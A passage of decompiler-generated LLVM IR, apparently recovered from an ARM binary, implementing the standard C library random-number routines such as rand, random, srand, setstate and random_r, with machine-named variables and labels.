  uselistorder label %dec_label_pc_153f0, { 1, 0 }
  uselistorder label %dec_label_pc_153b8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1533c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_15468 = call i32 @random()
  ret i32 %v0_15468

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 6, 10, 5, 4, 3, 2, 9, 11, 12, 8, 1, 7, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1546c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2c7f4.1170 to i32), i32* @r4, align 4
  %v2_15474 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_15474, i32* @r0, align 4
  %v1_1548c = call i32 @__pthread_return_void()
  %v1_1549c = call i32 @__pthread_return_0()
  %v2_154a0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_154a8 = call i32 @__GI_random_r(i32* inttoptr (i32 182284 to i32*), i32 %v2_154a0)
  store i32 %v2_15474, i32* @r0, align 4
  store i32 87232, i32* @lr, align 4
  %v1_154bc = call i32 @__pthread_return_void()
  %v3_154c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_1546c, i32* @r4, align 4
  ret i32 %v3_154c0
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_154ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_154ec, i32* @r0, align 4
  %v1_15508 = call i32 @__pthread_return_void()
  %v1_15518 = call i32 @__pthread_return_0()
  %v3_15528 = load i32, i32* bitcast (i32** @global_var_2c814.1183 to i32*), align 4
  store i32 %v3_15528, i32* @r4, align 4
  %v3_1552c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_2c80c)
  %v1_15534 = icmp slt i32 %v3_1552c, 0
  store i32 %v2_154ec, i32* @r0, align 4
  %. = select i1 %v1_15534, i32 0, i32 ptrtoint (i32** @global_var_2c810.1185 to i32)
  %v1_1554c = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1557c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_1557c, i32* @r0, align 4
  %v1_155a0 = call i32 @__pthread_return_void()
  %v1_155b0 = call i32 @__pthread_return_0()
  %v0_155b8 = load i32, i32* @r5, align 4
  %v0_155bc = load i32, i32* @r6, align 4
  %v0_155c0 = load i32, i32* @r8, align 4
  store i32 %v0_155c0, i32* @r0, align 4
  %v3_155c4 = load i32, i32* bitcast (i32** @global_var_2c814.1183 to i32*), align 4
  store i32 %v3_155c4, i32* @r4, align 4
  %v4_155c8 = inttoptr i32 %v0_155c0 to i32*
  %v5_155c8 = call i32 @__GI_initstate_r(i32* %v4_155c8, i32 %v0_155b8, i32 %v0_155bc, i32 ptrtoint (i32* @global_var_2c80c to i32))
  store i32 %v2_1557c, i32* @r0, align 4
  %v1_155dc = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_2c810.1185 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_1560c = load i32, i32* @r4, align 4
  %v9_1560c = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2c7f4.1170 to i32), i32* @r4, align 4
  %v2_15614 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_15614, i32* @r0, align 4
  %v1_15630 = call i32 @__pthread_return_void()
  %v1_15640 = call i32 @__pthread_return_0()
  %v0_15644 = load i32, i32* @r6, align 4
  store i32 %v0_15644, i32* @r0, align 4
  %v2_1564c = inttoptr i32 %v0_15644 to i32*
  %v3_1564c = call i32 @srandom_r(i32* %v2_1564c, i32 ptrtoint (i32* @global_var_2c80c to i32))
  store i32 %v2_15614, i32* @r0, align 4
  store i32 87656, i32* @lr, align 4
  %v1_15664 = call i32 @__pthread_return_void()
  store i32 %v3_1560c, i32* @r4, align 4
  store i32 %v9_1560c, i32* @r6, align 4
  ret i32 %v1_15664

; uselistorder directives
  uselistorder i32* @global_var_2c80c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2c80c to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_15688 = add i32 %tmp, 12
  %v2_15688 = inttoptr i32 %v1_15688 to i32*
  %v3_15688 = load i32, i32* %v2_15688, align 4
  %v3_1568c = load i32, i32* @r4, align 4
  store i32 %v3_1568c, i32* %stack_var_-20, align 4
  %v2_15690 = icmp eq i32 %v3_15688, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_15690, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_1569c1 = add i32 %tmp, 8
  %v2_1569c2 = inttoptr i32 %v1_1569c1 to i32*
  %v3_1569c3 = load i32, i32* %v2_1569c2, align 4
  store i32 %v3_1569c3, i32* %r1.global-to-local, align 4
  %v3_156b0 = add i32 %v3_1569c3, -4
  %v4_156b0 = inttoptr i32 %v3_156b0 to i32*
  store i32 0, i32* %v4_156b0, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_15698 = add i32 %tmp, 4
  %v3_15698 = inttoptr i32 %v2_15698 to i32*
  %v4_15698 = load i32, i32* %v3_15698, align 4
  %v1_1569c = add i32 %tmp, 8
  %v2_1569c = inttoptr i32 %v1_1569c to i32*
  %v3_1569c = load i32, i32* %v2_1569c, align 4
  store i32 %v3_1569c, i32* %r1.global-to-local, align 4
  %v3_156a0 = sub i32 %v4_15698, %v3_1569c
  %v4_156a4 = sdiv i32 %v3_156a0, 4
  %v4_156ac = mul i32 %v4_156a4, 5
  %v5_156ac = add i32 %v4_156ac, %v3_15688
  %v3_156b4 = add i32 %v3_1569c, -4
  %v4_156b4 = inttoptr i32 %v3_156b4 to i32*
  store i32 %v5_156ac, i32* %v4_156b4, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_156b8 = add i32 %arg1, 4
  store i32 %v1_156b8, i32* %r6.global-to-local, align 4
  %v2_156bc = inttoptr i32 %arg1 to i32*
  %v3_156bc = load i32, i32* %v2_156bc, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_156c4 = srem i32 %v3_156bc, 5
  store i32 %v2_156c4, i32* %r0.global-to-local, align 4
  %v2_156d0 = and i32 %v2_156c4, 1073741824
  %v3_156d0 = icmp ne i32 %v2_156d0, 0
  %v4_156d0 = mul nsw i32 %v2_156c4, 4
  %v2_156d4 = icmp ne i32 %v2_156c4, 4
  %v3_156d4 = and i1 %v3_156d0, %v2_156d4
  br i1 %v3_156d4, label %dec_label_pc_15730, label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %bb
  %v5_156d0 = add i32 %v4_156d0, ptrtoint (i32* @global_var_23ec4.1199 to i32)
  %v1_156d8 = add i32 %v4_156d0, add (i32 ptrtoint (i32* @global_var_23ec4.1199 to i32), i32 20)
  %v2_156d8 = inttoptr i32 %v1_156d8 to i32*
  %v3_156d8 = load i32, i32* %v2_156d8, align 4
  store i32 %v3_156d8, i32* %r5.global-to-local, align 4
  %v6_156dc = inttoptr i32 %v5_156d0 to i32*
  %v7_156dc = load i32, i32* %v6_156dc, align 4
  store i32 %v7_156dc, i32* %r7.global-to-local, align 4
  %v2_156e0 = icmp eq i32 %v2_156c4, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_156e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_156e8 = add i32 %v1_156e8, 16
  %v3_156e8 = inttoptr i32 %v2_156e8 to i32*
  store i32 %v3_156d8, i32* %v3_156e8, align 4
  %v0_156ec = load i32, i32* %r7.global-to-local, align 4
  %v1_156ec = load i32, i32* %r4.global-to-local, align 4
  %v2_156ec = add i32 %v1_156ec, 20
  %v3_156ec = inttoptr i32 %v2_156ec to i32*
  store i32 %v0_156ec, i32* %v3_156ec, align 4
  %v0_156f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_156f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_156f0 = add i32 %v1_156f0, 12
  %v3_156f0 = inttoptr i32 %v2_156f0 to i32*
  store i32 %v0_156f0, i32* %v3_156f0, align 4
  br i1 %v2_156e0, label %dec_label_pc_1571c, label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %dec_label_pc_156d8
  %v0_156f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_156f8 = add i32 %v0_156f8, -4
  %v2_156f8 = inttoptr i32 %v1_156f8 to i32*
  %v3_156f8 = load i32, i32* %v2_156f8, align 4
  %v1_156fc = load i32, i32* %r1.global-to-local, align 4
  %v2_156fc = sdiv i32 %v3_156f8, %v1_156fc
  store i32 %v2_156fc, i32* %r0.global-to-local, align 4
  %v4_15700 = mul i32 %v2_156fc, 4
  %v5_15700 = add i32 %v4_15700, %v0_156f8
  %v1_15704 = load i32, i32* %r4.global-to-local, align 4
  %v2_15704 = add i32 %v1_15704, 4
  %v3_15704 = inttoptr i32 %v2_15704 to i32*
  store i32 %v5_15700, i32* %v3_15704, align 4
  %v0_15708 = load i32, i32* %r0.global-to-local, align 4
  %v1_15708 = load i32, i32* %r7.global-to-local, align 4
  %v2_15708 = add i32 %v1_15708, %v0_15708
  %v0_1570c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1570c, i32* %r1.global-to-local, align 4
  %v2_15710 = srem i32 %v2_15708, %v0_1570c
  %v0_15714 = load i32, i32* %r6.global-to-local, align 4
  %v4_15714 = mul i32 %v2_15710, 4
  %v5_15714 = add i32 %v0_15714, %v4_15714
  store i32 %v5_15714, i32* %r0.global-to-local, align 4
  %v1_15718 = load i32, i32* %r4.global-to-local, align 4
  %v2_15718 = inttoptr i32 %v1_15718 to i32*
  store i32 %v5_15714, i32* %v2_15718, align 4
  br label %dec_label_pc_1571c

dec_label_pc_1571c:                               ; preds = %dec_label_pc_156d8, %dec_label_pc_156f8
  %v0_1571c = load i32, i32* %r6.global-to-local, align 4
  %v1_1571c = load i32, i32* %r5.global-to-local, align 4
  %v4_1571c = mul i32 %v1_1571c, 4
  %v5_1571c = add i32 %v4_1571c, %v0_1571c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15724 = load i32, i32* %r4.global-to-local, align 4
  %v2_15724 = add i32 %v1_15724, 24
  %v3_15724 = inttoptr i32 %v2_15724 to i32*
  store i32 %v5_1571c, i32* %v3_15724, align 4
  %v0_15728 = load i32, i32* %r6.global-to-local, align 4
  %v1_15728 = load i32, i32* %r4.global-to-local, align 4
  %v2_15728 = add i32 %v1_15728, 8
  %v3_15728 = inttoptr i32 %v2_15728 to i32*
  store i32 %v0_15728, i32* %v3_15728, align 4
  %v2_1572c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1572c, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_15730:                               ; preds = %bb
  %v0_15730 = call i32 @__errno_location()
  %v2_15738 = inttoptr i32 %v0_15730 to i32*
  store i32 22, i32* %v2_15738, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15740 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15740, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_156c4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1571c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_15748 = add i32 %tmp, 12
  %v2_15748 = inttoptr i32 %v1_15748 to i32*
  %v3_15748 = load i32, i32* %v2_15748, align 4
  store i32 %v3_15748, i32* %r3.global-to-local, align 4
  %v2_1574c = icmp eq i32 %v3_15748, 0
  %v3_15750 = load i32, i32* @r4, align 4
  store i32 %v3_15750, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1575c = add i32 %tmp, 8
  %v2_1575c = inttoptr i32 %v1_1575c to i32*
  %v3_1575c = load i32, i32* %v2_1575c, align 4
  store i32 %v3_1575c, i32* %lr.global-to-local, align 4
  br i1 %v2_1574c, label %dec_label_pc_15764, label %dec_label_pc_15788

dec_label_pc_15764:                               ; preds = %entry
  %v1_15764 = inttoptr i32 %v3_1575c to i32*
  %v2_15764 = load i32, i32* %v1_15764, align 4
  store i32 %v2_15764, i32* %r2.global-to-local, align 4
  %v2_1576c = mul i32 %v2_15764, 1103515245
  %v1_15774 = add i32 %v2_1576c, 12345
  %tmp10 = bitcast i32 %v1_15774 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_15778 = bitcast float %tmp11 to i32
  store i32 %v1_15778, i32* %r3.global-to-local, align 4
  store i32 %v1_15778, i32* %v1_15764, align 4
  %v0_15780 = load i32, i32* %r3.global-to-local, align 4
  %v2_15780 = inttoptr i32 %arg2 to i32*
  store i32 %v0_15780, i32* %v2_15780, align 4
  br label %dec_label_pc_157cc

dec_label_pc_15788:                               ; preds = %entry
  %v2_15788 = load i32, i32* %arg1, align 4
  store i32 %v2_15788, i32* %r2.global-to-local, align 4
  %v1_1578c = add i32 %tmp, 4
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  %v3_1578c = load i32, i32* %v2_1578c, align 4
  store i32 %v3_1578c, i32* %r0.global-to-local, align 4
  %v1_15790 = inttoptr i32 %v2_15788 to i32*
  %v2_15790 = load i32, i32* %v1_15790, align 4
  store i32 %v2_15790, i32* %r3.global-to-local, align 4
  %v1_15794 = inttoptr i32 %v3_1578c to i32*
  %v2_15794 = load i32, i32* %v1_15794, align 4
  %v4_15794 = add i32 %v3_1578c, 4
  store i32 %v4_15794, i32* %r0.global-to-local, align 4
  %v2_15798 = add i32 %v2_15794, %v2_15790
  store i32 %v2_15798, i32* %r3.global-to-local, align 4
  store i32 %v2_15798, i32* %v1_15790, align 4
  %v3_1579c = load i32, i32* %r2.global-to-local, align 4
  %v4_1579c = add i32 %v3_1579c, 4
  store i32 %v4_1579c, i32* %r2.global-to-local, align 4
  %v0_157a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_157a0 = add i32 %v0_157a0, 24
  %v2_157a0 = inttoptr i32 %v1_157a0 to i32*
  %v3_157a0 = load i32, i32* %v2_157a0, align 4
  store i32 %v3_157a0, i32* %r4.global-to-local, align 4
  %v0_157a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_157a4 = udiv i32 %v0_157a4, 2
  store i32 %v3_157a4, i32* %r3.global-to-local, align 4
  %v3_157a8 = icmp ult i32 %v4_1579c, %v3_157a0
  %v1_157ac = load i32, i32* %r5.global-to-local, align 4
  %v2_157ac = inttoptr i32 %v1_157ac to i32*
  store i32 %v3_157a4, i32* %v2_157ac, align 4
  br i1 %v3_157a8, label %dec_label_pc_157bc, label %bb

bb:                                               ; preds = %dec_label_pc_15788
  %v1_157b0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_157b0, i32* %r2.global-to-local, align 4
  %v0_157b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157b4, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_157bc:                               ; preds = %dec_label_pc_15788
  %v0_157b41 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157b41, i32* %r3.global-to-local, align 4
  %v1_157bc = load i32, i32* %r4.global-to-local, align 4
  %v3_157bc = icmp ult i32 %v0_157b41, %v1_157bc
  br i1 %v3_157bc, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_157bc
  store i32 %v0_157b41, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_157bc
  %v1_157c4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_157c4, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_157c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_157c8 = inttoptr i32 %v0_157c8 to i32*
  %v2_157c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_157c8, i32* %v1_157c8, align 4
  %v3_157c8 = add i32 %v0_157c8, 4
  %v4_157c8 = inttoptr i32 %v3_157c8 to i32*
  %v5_157c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_157c8, i32* %v4_157c8, align 4
  br label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %dec_label_pc_15764, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_157d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_157d0, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_157b41, { 1, 0, 2 }
  uselistorder i32 %v3_157a4, { 1, 0 }
  uselistorder i32 %v1_15778, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_157cc, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_157d8 = load i32, i32* @r4, align 4
  store i32 %v3_157d8, i32* %stack_var_-32, align 4
  %v6_157d8 = load i32, i32* @r5, align 4
  %v1_157dc = add i32 %tmp, 12
  %v2_157dc = inttoptr i32 %v1_157dc to i32*
  %v3_157dc = load i32, i32* %v2_157dc, align 4
  %v2_157e4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_157dc, 4
  br i1 %tmp29, label %.dec_label_pc_15890_crit_edge, label %dec_label_pc_157f4

.dec_label_pc_15890_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15890

dec_label_pc_157f4:                               ; preds = %entry
  %v0_157f4 = load i32, i32* @r0, align 4
  %v2_157f4 = icmp eq i32 %v0_157f4, 0
  %v1_157f8 = add i32 %tmp, 8
  %v2_157f8 = inttoptr i32 %v1_157f8 to i32*
  %v3_157f8 = load i32, i32* %v2_157f8, align 4
  store i32 %v3_157f8, i32* %r7.global-to-local, align 4
  br i1 %v2_157f4, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_157f4
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_157f4, %bb
  %v0_15804 = phi i32 [ %v0_157f4, %dec_label_pc_157f4 ], [ 1, %bb ]
  %v2_15800 = icmp eq i32 %v3_157dc, 0
  %v2_15804 = inttoptr i32 %v3_157f8 to i32*
  store i32 %v0_15804, i32* %v2_15804, align 4
  br i1 %v2_15800, label %dec_label_pc_1588c, label %dec_label_pc_1580c

dec_label_pc_1580c:                               ; preds = %bb21
  %v1_1580c = add i32 %tmp, 16
  %v2_1580c = inttoptr i32 %v1_1580c to i32*
  %v3_1580c = load i32, i32* %v2_1580c, align 4
  store i32 %v3_1580c, i32* %sb.global-to-local, align 4
  %v0_15810 = load i32, i32* @r0, align 4
  %v0_15814 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15814, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1585c23 = icmp sgt i32 %v3_1580c, 1
  br i1 %v5_1585c23, label %dec_label_pc_15820, label %dec_label_pc_15860

dec_label_pc_15820:                               ; preds = %dec_label_pc_1580c, %dec_label_pc_15820
  %v0_1583025 = phi i32 [ %v0_15850.pre, %dec_label_pc_15820 ], [ %v0_15810, %dec_label_pc_1580c ]
  %v1_1584824 = phi i32 [ %v5_15848, %dec_label_pc_15820 ], [ %v0_15814, %dec_label_pc_1580c ]
  %v2_15820 = srem i32 %v0_1583025, ptrtoint ([96 x i8]* @global_var_1f31d.1203 to i32)
  %v2_1582c = mul i32 %v2_15820, 16807
  %v2_15834 = sdiv i32 %v0_1583025, ptrtoint ([96 x i8]* @global_var_1f31d.1203 to i32)
  %tmp30 = mul i32 %v2_15834, -2836
  %v2_15840 = add i32 %v2_1582c, %tmp30
  %v8_15840 = icmp slt i32 %v2_15840, 0
  %v2_15844 = add i32 %v2_15840, 2147483647
  %v2_15844.v2_15840 = select i1 %v8_15840, i32 %v2_15844, i32 %v2_15840
  store i32 %v2_15844.v2_15840, i32* @r5, align 4
  %v2_15848 = add i32 %v1_1584824, 4
  %v3_15848 = inttoptr i32 %v2_15848 to i32*
  store i32 %v2_15844.v2_15840, i32* %v3_15848, align 4
  %v4_15848 = load i32, i32* %sl.global-to-local, align 4
  %v5_15848 = add i32 %v4_15848, 4
  store i32 %v5_15848, i32* %sl.global-to-local, align 4
  %v0_1584c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1584c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_15850.pre = load i32, i32* @r5, align 4
  %v1_15858 = add i32 %v0_1584c.pre, 1
  store i32 %v1_15858, i32* %r8.global-to-local, align 4
  %v5_1585c = icmp slt i32 %v0_1584c.pre, %v1_1584c.pre
  br i1 %v5_1585c, label %dec_label_pc_15820, label %dec_label_pc_1584c.dec_label_pc_15860_crit_edge

dec_label_pc_1584c.dec_label_pc_15860_crit_edge:  ; preds = %dec_label_pc_15820
  %v0_1586c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15860

dec_label_pc_15860:                               ; preds = %dec_label_pc_1584c.dec_label_pc_15860_crit_edge, %dec_label_pc_1580c
  %v0_1586c = phi i32 [ %v0_1586c.pre, %dec_label_pc_1584c.dec_label_pc_15860_crit_edge ], [ %v0_15814, %dec_label_pc_1580c ]
  %v0_15864.lcssa = phi i32 [ %v1_1584c.pre, %dec_label_pc_1584c.dec_label_pc_15860_crit_edge ], [ %v3_1580c, %dec_label_pc_1580c ]
  %v2_15864 = mul i32 %v0_15864.lcssa, 10
  store i32 %v2_15864, i32* @r4, align 4
  %v0_15868 = load i32, i32* %r6.global-to-local, align 4
  %v1_15868 = add i32 %v0_15868, 20
  %v2_15868 = inttoptr i32 %v1_15868 to i32*
  %v3_15868 = load i32, i32* %v2_15868, align 4
  %v4_1586c = mul i32 %v3_15868, 4
  %v5_1586c = add i32 %v0_1586c, %v4_1586c
  %v1_15870 = inttoptr i32 %v0_15868 to i32*
  store i32 %v5_1586c, i32* %v1_15870, align 4
  %v3_15870 = add i32 %v0_15868, 4
  %v4_15870 = inttoptr i32 %v3_15870 to i32*
  %v5_15870 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_15870, i32* %v4_15870, align 4
  br label %dec_label_pc_1587c

dec_label_pc_15878:                               ; preds = %dec_label_pc_1587c
  %v0_15880 = load i32, i32* %r6.global-to-local, align 4
  %v2_15878 = inttoptr i32 %v0_15880 to i32*
  %v3_15878 = call i32 @__GI_random_r(i32* %v2_15878, i32 %v2_157e4)
  br label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %dec_label_pc_15860, %dec_label_pc_15878
  %v0_1587c = load i32, i32* @r4, align 4
  %v1_1587c = add i32 %v0_1587c, -1
  store i32 %v1_1587c, i32* @r4, align 4
  %v6_1587c = icmp slt i32 %v1_1587c, 0
  br i1 %v6_1587c, label %dec_label_pc_1588c, label %dec_label_pc_15878

dec_label_pc_1588c:                               ; preds = %dec_label_pc_1587c, %bb21
  %v2_15894.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %.dec_label_pc_15890_crit_edge, %dec_label_pc_1588c
  %v2_15894 = phi i32 [ %v3_157d8, %.dec_label_pc_15890_crit_edge ], [ %v2_15894.pre, %dec_label_pc_1588c ]
  %v26_15894 = phi i32 [ -1, %.dec_label_pc_15890_crit_edge ], [ 0, %dec_label_pc_1588c ]
  store i32 %v2_15894, i32* @r4, align 4
  store i32 %v6_157d8, i32* @r5, align 4
  ret i32 %v26_15894

; uselistorder directives
  uselistorder i32 %v1_1587c, { 1, 0 }
  uselistorder i32 %v0_15868, { 1, 0, 2 }
  uselistorder i32 %v0_1584c.pre, { 1, 0 }
  uselistorder i32 %v5_15848, { 1, 0 }
  uselistorder i32 %v2_15840, { 2, 1, 0 }
  uselistorder i32 %v0_1583025, { 1, 0 }
  uselistorder i32 %v0_15814, { 1, 0, 2 }
  uselistorder i32 %v3_1580c, { 1, 0, 2 }
  uselistorder i32 %v3_157dc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([96 x i8]* @global_var_1f31d.1203 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_15890, { 1, 0 }
  uselistorder label %dec_label_pc_1587c, { 1, 0 }
  uselistorder label %dec_label_pc_15820, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15898:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_15898 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15898, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_15898
  %v2_15898 = load i32, i32* @r7, align 4
  %v5_15898 = udiv i32 %v2_15898, 8
  %v6_15898 = and i32 %v5_15898, %arg1
  store i32 %v6_15898, i32* %r4.global-to-local, align 4
  %v2_1589c = load i32, i32* @sp, align 4
  %v8_1589c = shl i32 %v2_1589c, %arg3
  %v9_1589c = and i32 %v8_1589c, %arg2
  call void @__pseudo_branch(i32 %v9_1589c)
  %v0_158a0.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_158a0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_158a0.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_158a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_158a0 = load i32, i32* @fp, align 4
  %v8_158a0 = shl i32 %v2_158a0, %v3_158a0
  %v9_158a0 = and i32 %v8_158a0, %v1_158a0
  store i32 %v9_158a0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_15898, %bb
  %v10_158a0 = phi i32 [ %arg1, %dec_label_pc_15898 ], [ %v9_158a0, %bb ], [ %v1_158a0, %.thread ]
  ret i32 %v10_158a0

; uselistorder directives
  uselistorder i32 %v1_158a0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_158a8 = load i32, i32* @r4, align 4
  store i32 %v3_158a8, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_158c8, label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %entry
  %v2_158b8 = icmp ugt i32 %arg2, 254
